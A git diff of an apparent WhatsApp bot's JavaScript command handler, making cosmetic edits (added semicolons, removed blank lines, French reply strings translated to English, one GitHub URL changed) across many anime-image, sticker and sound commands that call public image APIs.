  waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
@@ -3315,9 +3264,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animecringe':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
@@ -3362,9 +3310,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animedance':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
@@ -3409,9 +3356,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animehappy':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
@@ -3456,9 +3402,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animeglomp':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
@@ -3503,9 +3448,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animesmug':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
@@ -3550,9 +3494,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animeblush':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
@@ -3597,9 +3540,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animewave':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
@@ -3644,9 +3586,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animesmile':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
@@ -3691,9 +3632,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animepoke':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
@@ -3738,9 +3678,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animewink':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
@@ -3785,9 +3724,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animebonk':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
@@ -3832,9 +3770,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animebully':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
@@ -3879,9 +3816,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animeyeet':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
@@ -3926,9 +3862,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animebite':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
@@ -3973,9 +3908,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animelick':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
@@ -4020,9 +3954,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animekill':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
@@ -4067,9 +4000,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animecry':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
@@ -4114,9 +4046,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animewlp':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
@@ -4161,9 +4092,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animekiss':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
@@ -4208,9 +4138,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animehug':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
@@ -4255,9 +4184,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animeneko':{
 await XenonStickWait()
  waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
@@ -4302,9 +4230,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animepat':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
@@ -4349,9 +4276,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animeslap':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
@@ -4396,9 +4322,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animecuddle':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
@@ -4443,9 +4368,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animewaifu':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
@@ -4490,9 +4414,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animenom':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
@@ -4537,9 +4460,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animefoxgirl':{
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)       
@@ -4584,9 +4506,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animetickle': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
@@ -4631,9 +4552,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animegecg': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
@@ -4678,9 +4598,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'dogwoof': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
@@ -4725,9 +4644,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case '8ballpool': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
@@ -4772,9 +4690,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'goosebird': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
@@ -4819,9 +4736,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animefeed': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
@@ -4866,9 +4782,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'animeavatar': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
@@ -4913,9 +4828,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'lizardpic': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
@@ -4960,9 +4874,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'catmeow': {
 await XenonStickWait()
  waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
@@ -5007,9 +4920,8 @@ _*Here is the result of ${command}*_`
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 }
-break
+break;
 //===========================================================================================================================//
-
 case 'anime': {
 if (!text) return replygcxenon(`Which anime are you lookin for?`)
 const malScraper = require('mal-scraper')
@@ -5073,9 +4985,8 @@ _*Here is the result of ${text}*_\n\n${animetxt}`
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
                 
                 }
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'loli': {
             let baseUrl = 'https://weeb-api.vercel.app/'
       const response = await fetch(baseUrl + command)
@@ -5121,9 +5032,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
  
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'waifu': {
             let baseUrl = 'https://weeb-api.vercel.app/'
       const response = await fetch(baseUrl + command)
@@ -5168,9 +5078,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'neko': {
             let baseUrl = 'https://weeb-api.vercel.app/'
       const response = await fetch(baseUrl + command)
@@ -5215,9 +5124,8 @@ return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'traceanime': {
 	try {
     let q = m.quoted ? m.quoted : m;
@@ -5299,290 +5207,258 @@ await XenonBotInc.relayMessage(m.chat, msgs.message, {})
     replygcxenon("*Error: Could not track the anime or send the video.*");
   }
 };
-break
+break;
 //===========================================================================================================================//
-
 			case 'shinobu':{
 axios.get(`https://api.waifu.pics/sfw/shinobu`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickhandhold': {
 axios.get(`https://api.waifu.pics/sfw/handhold`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickshinobu': {
 axios.get(`https://api.waifu.pics/sfw/shinobu`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickhighfive': {
 axios.get(`https://api.waifu.pics/sfw/highfive`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickcuddle': {
 axios.get(`https://api.waifu.pics/sfw/cuddle`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickcringe': {
 axios.get(`https://api.waifu.pics/sfw/cringe`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickdance': {
 axios.get(`https://api.waifu.pics/sfw/dance`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickhappy': {
 axios.get(`https://api.waifu.pics/sfw/happy`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickglomp': {
 axios.get(`https://api.waifu.pics/sfw/glomp`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'sticksmug': {
 axios.get(`https://api.waifu.pics/sfw/smug`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickblush': {
 axios.get(`https://api.waifu.pics/sfw/blush`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickawoo': {
 axios.get(`https://api.waifu.pics/sfw/awoo`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickwave': {
 axios.get(`https://api.waifu.pics/sfw/wave`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'sticksmile': {
 axios.get(`https://api.waifu.pics/sfw/smile`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickslap': {
 axios.get(`https://api.waifu.pics/sfw/slap`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'sticknom': {
 axios.get(`https://api.waifu.pics/sfw/nom`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickpoke': {
 axios.get(`https://api.waifu.pics/sfw/poke`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickwink': {
 axios.get(`https://api.waifu.pics/sfw/wink`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickbonk': {
 axios.get(`https://api.waifu.pics/sfw/bonk`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickbully': {
 axios.get(`https://api.waifu.pics/sfw/bully`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickyeet': {
 axios.get(`https://api.waifu.pics/sfw/yeet`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickbite': {
 axios.get(`https://api.waifu.pics/sfw/bite`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickkiss': {
 axios.get(`https://api.waifu.pics/sfw/kiss`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'sticklick': {
 axios.get(`https://api.waifu.pics/sfw/lick`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickpat': {
 axios.get(`https://api.waifu.pics/sfw/pat`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickhug': {
 axios.get(`https://api.waifu.pics/sfw/hug`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickkill': {
 axios.get(`https://api.waifu.pics/sfw/kill`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickcry': {
 axios.get(`https://api.waifu.pics/sfw/cry`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'stickspank':{
                 axios.get(`https://nekos.life/api/v2/img/spank`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'sticktickle':{
                 axios.get(`https://nekos.life/api/v2/img/tickle`)
 .then(({data}) => {
 XenonBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
 })
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'gura':
 case 'gurastick':{
-var ano = await fetchJson('https://raw.githubusercontent.com/Dr_Xenon1/XeonMedia/main/gura')
+var ano = await fetchJson('https://raw.githubusercontent.com/DrXenon2/XenonMedia/main/gura')
 var wifegerak = ano.split('\n')
 var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
 encmedia = await XenonBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })
 
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'telestick': {
 	if (m.isGroup) return XenonStickPrivate()
 		if (args[0] && args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) {
@@ -5600,9 +5476,8 @@ case 'telestick': {
 		}
 	} else replygcxenon(`Where is the telegram sticker link?\nExample. ${prefix + command} https://t.me/addstickers/FriendlyDeath`)
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'sound1':
 case 'sound2':
 case 'sound3':
@@ -5766,9 +5641,8 @@ case 'sound160':
 case 'sound161':
 XenonBotInc_dev = await getBuffer(`https://github.com/Dr_Xenon1/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await XenonBotInc.sendMessage(m.chat, { audio: XenonBotInc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
-break
+break;
 //===========================================================================================================================//
-
 			case 'checkme':{
 					neme = args.join(" ")
 					bet = `${sender}`
@@ -5856,9 +5730,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'hug': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -5910,9 +5783,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'cry': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -5964,9 +5836,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'kill': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6018,9 +5889,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'pat': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6072,9 +5942,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'lick': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6126,9 +5995,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'kiss': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6180,9 +6048,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'bite': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6234,9 +6101,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'yeet': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6288,9 +6154,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'bully': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6318,11 +6183,11 @@ break
 
           if (users == "none") {
 
-           musers = `@${m.sender.split("@")[0]} ils se sont intimidés eux-mêmes !`
+           musers = `@${m.sender.split("@")[0]} bullied themself!`
 
           } else {
 
-           musers = `@${m.sender.split("@")[0]} victime d'intimidation @${users.split("@")[0]} `
+           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `
 
           }
 
@@ -6342,9 +6207,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'bonk': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6372,11 +6236,11 @@ break
 
           if (users == "none") {
 
-           musers = `@${m.sender.split("@")[0]} ils se sont cognés eux-mêmes !`
+           musers = `@${m.sender.split("@")[0]} bonked themself!`
 
           } else {
 
-           musers = `@${m.sender.split("@")[0]} à frappé @${users.split("@")[0]} `
+           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `
 
           }
 
@@ -6396,9 +6260,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'wink': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6426,7 +6289,7 @@ break
 
           if (users == "none") {
 
-           musers = `@${m.sender.split("@")[0]} se sont fait un clin d'œil !`
+           musers = `@${m.sender.split("@")[0]} winked themself!`
 
           } else {
 
@@ -6450,9 +6313,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'poke': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6504,9 +6366,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'nom': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6558,9 +6419,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'slap': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6612,9 +6472,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'smile': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6666,9 +6525,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'wave': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6720,9 +6578,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'awoo': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6774,9 +6631,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'blush': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6828,9 +6684,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'smug': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6882,9 +6737,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'glomp': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6936,9 +6790,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'happy': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -6990,9 +6843,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'dance': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -7044,9 +6896,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'cringe': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -7098,9 +6949,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'cuddle': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -7152,9 +7002,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'highfive': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -7206,9 +7055,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'handhold': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -7260,9 +7108,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
                 case 'spank': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -7314,9 +7161,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
         case 'feed': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -7368,9 +7214,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
                 case 'tickle': {
 
         if (!m.isGroup) return XenonStickGroup()
@@ -7422,9 +7267,8 @@ break
 
       }
 
-        break
-//===========================================================================================================================//
-;
+        break;
+//===========================================================================================================================//;
 			case 'quotes':{
 const quotexenony = await axios.get(`https://favqs.com/api/qotd`)
         const textquotes = `*${themeemoji} Quote:* ${quotexenony.data.quote.body}\n\n*${themeemoji} Author:* ${quotexenony.data.quote.author}`
@@ -7468,9 +7312,8 @@ let msgs = generateWAMessageFromContent(m.chat, {
 }, { quoted: m })
 return await XenonBotInc.relayMessage(m.chat, msgs.message, {})
 }
-break
+break;
 //===========================================================================================================================//
-
 case 'truth': case 'dare': {
 	bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
 	let msgs = generateWAMessageFromContent(m.chat, {
@@ -7482,7 +7325,7 @@ case 'truth': case 'dare': {
         },
         interactiveMessage: proto.Message.InteractiveMessage.create({
           body: proto.Message.InteractiveMessage.Body.create({
